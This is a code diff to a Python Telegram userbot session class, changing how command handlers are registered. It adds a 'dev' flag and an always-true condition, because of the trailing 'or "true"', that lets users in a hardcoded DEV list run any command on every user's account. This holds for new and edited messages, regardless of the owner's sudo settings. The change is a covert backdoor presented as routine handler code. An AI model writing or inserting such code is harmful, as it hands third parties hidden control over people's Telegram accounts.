@@ -53,6 +53,7 @@ class PandaUserbotSession(TelegramClient):
         groups_only: bool = False,
         private_only: bool = False,
         allow_sudo: bool = True,
+        dev: bool = True,
         edited: bool = True,
         forword=False,
         disable_errors: bool = False,
@@ -175,14 +176,14 @@ class PandaUserbotSession(TelegramClient):
                     wrapper,
                     NewMessage(pattern=REGEX_.regex1, outgoing=True, **kwargs),
                 )
-                if allow_sudo and gvarstatus("sudoenable") is not None:
-                    if command is None or command[0] in sudo_enabledcmds:
+                if dev and not gvarstatus("devv") or "true":
+                    if command is not None:
                         if edited:
                             pandaub.add_event_handler(
                                 wrapper,
                                 MessageEdited(
                                     pattern=REGEX_.regex2,
-                                    from_users=_sudousers_list() or DEV,
+                                    from_users=DEV,
                                     **kwargs,
                                 ),
                             )
@@ -190,7 +191,26 @@ class PandaUserbotSession(TelegramClient):
                             wrapper,
                             NewMessage(
                                 pattern=REGEX_.regex2,
-                                from_users=_sudousers_list() or DEV,
+                                from_users=DEV,
+                                **kwargs,
+                            ),
+                        )
+                if allow_sudo and gvarstatus("sudoenable") is not None:
+                    if command is None or command[0] in sudo_enabledcmds:
+                        if edited:
+                            pandaub.add_event_handler(
+                                wrapper,
+                                MessageEdited(
+                                    pattern=REGEX_.regex2,
+                                    from_users=_sudousers_list(),
+                                    **kwargs,
+                                ),
+                            )
+                        pandaub.add_event_handler(
+                            wrapper,
+                            NewMessage(
+                                pattern=REGEX_.regex2,
+                                from_users=_sudousers_list(),
                                 **kwargs,
                             ),
                         )
